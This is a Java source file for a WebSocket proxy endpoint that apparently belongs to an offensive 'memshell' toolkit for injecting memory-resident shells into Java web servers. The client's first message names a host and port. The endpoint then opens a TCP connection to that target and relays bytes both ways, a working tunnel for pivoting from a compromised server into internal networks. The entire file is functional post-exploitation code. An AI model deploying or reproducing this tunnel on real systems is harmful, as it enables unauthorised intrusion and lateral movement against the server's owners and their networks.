package com.reajason.javaweb.memshell.shelltool.wsproxy;

import javax.websocket.Endpoint;
import javax.websocket.EndpointConfig;
import javax.websocket.MessageHandler;
import javax.websocket.Session;
import javax.websocket.CloseReason;
import java.net.InetSocketAddress;
import java.nio.ByteBuffer;
import java.nio.channels.AsynchronousSocketChannel;
import java.nio.channels.CompletionHandler;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;

/**
 * @author ReaJason
 * @since 2026/1/14
 */
public class ProxyWebSocket extends Endpoint implements MessageHandler.Whole<ByteBuffer>, CompletionHandler<Integer, Session> {
    private Session session;
    private long messageCount = 0;
    private AsynchronousSocketChannel currentClient = null;
    private final ByteBuffer buffer = ByteBuffer.allocate(32768);

    public ProxyWebSocket() {
    }

    @Override
    public void onOpen(Session session, EndpointConfig endpointConfig) {
        this.messageCount = 0;
        this.session = session;
        session.addMessageHandler(this);
    }

    private void readFromServer() {
        if (currentClient != null && currentClient.isOpen() && session.isOpen()) {
            buffer.clear();
            currentClient.read(buffer, session, this);
        }
    }

    @Override
    public void onMessage(ByteBuffer message) {
        try {
            messageCount++;
            process(message, session);
        } catch (Exception e) {
            closeQuietly();
        }
    }

    private void process(ByteBuffer messageBuffer, Session channel) {
        try {
            if (messageCount > 1 && currentClient != null && currentClient.isOpen()) {
                currentClient.write(messageBuffer).get();
            } else if (messageCount == 1) {
                byte[] bytes = new byte[messageBuffer.remaining()];
                messageBuffer.get(bytes);
                String values = new String(bytes);

                String[] array = values.split(" ");
                if (array.length < 2) return;
                String[] addrArray = array[1].split(":");

                currentClient = AsynchronousSocketChannel.open();
                int port = Integer.parseInt(addrArray[1]);
                InetSocketAddress hostAddress = new InetSocketAddress(addrArray[0], port);

                Future<Void> future = currentClient.connect(hostAddress);
                try {
                    future.get(10, TimeUnit.SECONDS);
                } catch (Exception e) {
                    channel.getBasicRemote().sendText("HTTP/1.1 503 Service Unavailable\r\n\r\n");
                    closeQuietly();
                    return;
                }
                channel.getBasicRemote().sendText("HTTP/1.1 200 Connection Established\r\n\r\n");
                readFromServer();
            }
        } catch (Exception e) {
            closeQuietly();
        }
    }


    @Override
    public void completed(Integer result, Session attachment) {
        if (result == -1) {
            closeQuietly();
            return;
        }

        try {
            if (result > 0) {
                buffer.flip();
                if (attachment.isOpen()) {
                    attachment.getBasicRemote().sendBinary(buffer);
                }
            }
            readFromServer();
        } catch (Exception e) {
            closeQuietly();
        }
    }

    @Override
    public void failed(Throwable exc, Session attachment) {
        closeQuietly();
    }

    @Override
    public void onClose(Session session, CloseReason closeReason) {
        closeQuietly();
    }

    @Override
    public void onError(Session session, Throwable thr) {
        closeQuietly();
    }

    private void closeQuietly() {
        try {
            if (currentClient != null && currentClient.isOpen()) {
                currentClient.close();
            }
        } catch (Exception ignored) {
        }
        try {
            if (session != null && session.isOpen()) {
                session.close();
            }
        } catch (Exception ignored) {
        }
    }
}
